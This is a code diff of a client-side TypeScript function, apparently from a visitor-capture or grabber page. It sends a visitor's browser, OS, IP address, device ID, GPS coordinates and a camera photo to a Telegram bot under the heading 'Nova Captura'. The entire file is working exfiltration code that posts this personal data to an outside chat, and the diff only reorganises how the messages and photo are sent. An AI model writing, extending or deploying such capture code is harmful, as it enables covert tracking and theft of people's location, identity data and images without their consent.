@@ -1,6 +1,6 @@
 "use client"
 
-import { LocationInfo, DeviceInfo, CaptureData } from "@/types/telegram"
+import { CaptureData } from "@/types/telegram"
 
 export async function sendTelegramMessage(
   botToken: string,
@@ -8,69 +8,74 @@ export async function sendTelegramMessage(
   data: CaptureData
 ): Promise<void> {
   try {
-    // Send device info first
+    // Send device info
     const deviceInfoMessage = `
-🔍 *Novo Acesso Detectado*
-📱 *Dispositivo:* ${data.deviceInfo.browser}
-💻 *Sistema:* ${data.deviceInfo.os}
-🌐 *IP:* ${data.deviceInfo.ip}
-⏰ *Horário:* ${new Date(data.deviceInfo.timestamp).toLocaleString()}
-🆔 *ID:* ${data.deviceInfo.visitorId}
-    `.trim()
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: deviceInfoMessage,
-        parse_mode: 'Markdown'
-      })
-    })
+📱 *Nova Captura*
+━━━━━━━━━━━━━━━━━━━━━━━━
+📌 *Informações do Dispositivo*
+• Navegador: ${data.deviceInfo.browser}
+• Sistema: ${data.deviceInfo.os}
+• IP: ${data.deviceInfo.ip}
+• Horário: ${new Date(data.deviceInfo.timestamp).toLocaleString()}
+• ID: ${data.deviceInfo.visitorId}
+`
 
     // Send location if available
+    let locationMessage = ""
     if (data.location.latitude !== 0 && data.location.longitude !== 0) {
-      const locationMessage = `
-📍 *Localização:*
-Latitude: ${data.location.latitude}
-Longitude: ${data.location.longitude}
-[Ver no Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})
-      `.trim()
+      locationMessage = `
+📍 *Localização*
+• Latitude: ${data.location.latitude}
+• Longitude: ${data.location.longitude}
+• [Ver no Google Maps](https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude})
+`
+    }
 
-      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
+    // Send text message first
+    const textMessage = deviceInfoMessage + locationMessage
+    const textResponse = await fetch(
+      `https://api.telegram.org/bot${botToken}/sendMessage`,
+      {
+        method: "POST",
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
         body: JSON.stringify({
           chat_id: chatId,
-          text: locationMessage,
-          parse_mode: 'Markdown'
-        })
-      })
+          text: textMessage,
+          parse_mode: "Markdown",
+          disable_web_page_preview: false,
+        }),
+      }
+    )
+
+    if (!textResponse.ok) {
+      throw new Error(`Failed to send text message: ${textResponse.statusText}`)
     }
 
     // Send image if available
     if (data.image) {
-      try {
-        const formData = new FormData()
-        const blob = await fetch(data.image).then(r => r.blob())
-        formData.append('photo', blob, 'capture.jpg')
-        formData.append('chat_id', chatId)
-        formData.append('caption', '📸 Captura da câmera')
+      const imageResponse = await fetch(
+        `https://api.telegram.org/bot${botToken}/sendPhoto`,
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            photo: data.image,
+            caption: "📸 Foto capturada",
+          }),
+        }
+      )
 
-        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        })
-      } catch (error) {
-        console.error('Error sending image to Telegram:', error)
+      if (!imageResponse.ok) {
+        throw new Error(`Failed to send image: ${imageResponse.statusText}`)
       }
     }
   } catch (error) {
-    console.error('Error sending to Telegram:', error)
+    console.error("Error sending to Telegram:", error)
     throw error
   }
 } 
